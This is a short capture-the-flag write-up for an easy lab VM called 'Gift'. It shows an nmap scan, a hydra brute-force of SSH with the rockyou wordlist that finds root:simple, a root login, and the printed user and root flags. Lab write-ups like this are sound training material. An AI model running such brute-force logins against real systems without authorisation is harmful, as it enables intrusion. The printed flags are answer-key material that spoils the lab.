@@ -1,0 +1,72 @@
+---
+tags: []
+---
+# Gift
+
+- **Description:** A really easy VM. Thats a gift :)
+- **Difficulty:** Easy
+
+---
+
+## 🔎 Solution
+When I booted the Gift VM it picked up an IP address. 
+A quick **nmap** service scan shows 2 open ports: SSH on 22 and HTTP on 80.
+```
+> nmap -sV 10.0.2.4
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
+80/tcp open  http    nginx
+MAC Address: 08:00:27:0A:DB:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+I opened `http://<IP-address>:80` in the browser and the page only displayed a short line of text (as in the screenshot) - not much to go on (mayybe ^^).
+<div style={{ width: '100%', margin: '0 auto' }}>
+  <img src={require("./web.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+Since SSH was available on port 22 I decided to try a brute-force approach for valid credentials. 
+For usernames I prepared a small list of common accounts (`kali`, `root`, `gift`) in `username.txt`, and for passwords I used the `rockyou` wordlist.
+
+I ran `hydra` against the SSH service and it returned a successful credential pair: `root:simple`.
+```
+> hydra -L username.txt -P rockyou.txt -s 22 ssh://10.0.2.4
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-04 10:08:34
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 57377596 login tries (l:4/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.0.2.4:22/
+[22][ssh] host: 10.0.2.4   login: root   password: simple
+[STATUS] 14346452.00 tries/min, 14346452 tries in 00:01h, 43031147 to do in 00:03h, 13 active
+```
+
+Using the discovered credentials I SSHed into the box:
+```
+> ssh root@10.0.2.4
+root@10.0.2.4's password: 
+IM AN SSH SERVER
+```
+
+Once in, listing the home directory revealed 2 flag files. 
+```
+gift:~# ls
+root.txt  user.txt
+```
+
+Reading them gave the user and root flags:
+```
+gift:~# cat user.txt 
+HMV665sXzDS
+gift:~# cat root.txt 
+HMVtyr543FG
+gift:~# 
+```
+
+## 🚩Flag
+**User flag:**
+> `HMV665sXzDS`
+
+**Root flag:**
+> `HMVtyr543FG`
+
